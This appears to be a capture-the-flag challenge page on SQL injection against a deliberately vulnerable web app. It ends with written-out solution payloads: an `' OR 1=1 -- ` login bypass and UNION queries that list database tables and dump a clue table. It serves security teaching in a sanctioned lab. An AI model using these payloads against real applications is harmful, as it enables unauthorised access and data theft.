# SQL injection challenge

This challenge is about **⁠⁠⁠web application security**⁠⁠⁠. The clue in this challenge is hidden in a web application, and not accessible through normal use of the application, so you'll need to hack it.

**⁠⁠SQL injection attacks**⁠⁠⁠ (SQLi) are used by hackers to bypass authentication, read sensitive data, or modify the information in a database. This can occur whenever unsanitized user input is part of an SQL query and could allow the attacker to change, or insert additional SQL statements into the code. It is one of the most severe risks to modern web applications, has been **⁠ranked the #1 risk by OWASP** since 2010 and **⁠⁠⁠constitutes over 44% of the web application attacks**⁠⁠⁠ recorded by Akamai in Q2 2016.

This website is vulnerable to SQLi, and you are granted permission to attack the application in order to retrieve the clue. **⁠⁠⁠The challenge is to bypass the login and find the clue**⁠⁠⁠ by using the search field that is shown when you are authenticated. You will have to use common SQLi tricks such as `⁠⁠⁠⁠' OR 1=1`⁠⁠⁠⁠ and merge datasets with `⁠⁠⁠⁠UNION`⁠⁠⁠⁠. When you are logged in you need to find a way to get a list of all tables in the database and finally get data from the table which seems to include the most interesting data.

## Login
**Username:** <code>admin</code>  
**Password:** <code>' OR 1=1 -- </code> (include the space at the end)

## Search Box -- Get table names
**Search Input:** <code>' UNION ALL SELECT table_name, 1, 1 FROM information_schema.tables WHERE table_schema=database() -- </code> (include the space at the end)

## Search Box -- Get Challenge Clue
**Search Input:** <code>' UNION ALL SELECT *, 1 FROM challenge_clue -- </code> (include the space at the end)
